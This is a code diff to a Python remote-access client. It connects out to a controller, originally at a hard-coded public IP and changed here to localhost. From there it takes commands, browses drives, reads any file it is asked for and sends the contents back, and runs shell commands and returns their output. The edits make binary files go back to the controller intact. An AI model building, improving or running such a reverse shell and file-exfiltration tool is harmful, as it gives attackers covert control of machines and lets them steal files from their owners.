@@ -4,7 +4,7 @@ import subprocess
     
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('165.227.9.185', 9999))
+s.connect(('127.0.0.1', 9999))
 
 nav = ""
 
@@ -34,13 +34,12 @@ if s.recv(1024).decode("utf-8") == "you connect successfully!":
                     file_path = get_loc(nav) + "/" + to_do[4:]
                 print("dld file:", file_path)
                 f = open(file_path, "rb")
-                file_content = f.read().decode("utf-8")
-                print("file_content:", file_content)
+                file_content = f.read()
                 f.close()
             except:
-                file_content = "download err"
-            print("dld file content:", file_content)
-            s.send((file_content + "\ndone1997").encode("gb2312", "ignore"))
+                file_content = b"download err"
+            print("dld file content:", file_content.decode("utf-8", "ignore"))
+            s.send((file_content + b"\ndone1997"))
 
         elif to_do[:2] == "cd" or to_do[:2].lower() == "a:" or to_do[:2].lower() == "c:" or to_do[:2].lower() == "d:" or to_do[:2].lower() == "e:" or to_do[:2].lower() == "f:" or to_do[:2].lower() == "g:":
             if nav == "":
@@ -73,8 +72,10 @@ if s.recv(1024).decode("utf-8") == "you connect successfully!":
             if output == b"":
                 output = b"return value is empty string, so I return this"
             print("output:", output.decode("gb2312", "ignore"))
-            s.send((output + b"\ndone1997").decode("gb2312", "ignore").encode("gb2312", "ignore"))
+            s.send((output + b"\ndone1997"))
             
 
 s.close()
 print("connection closed")
+
+    
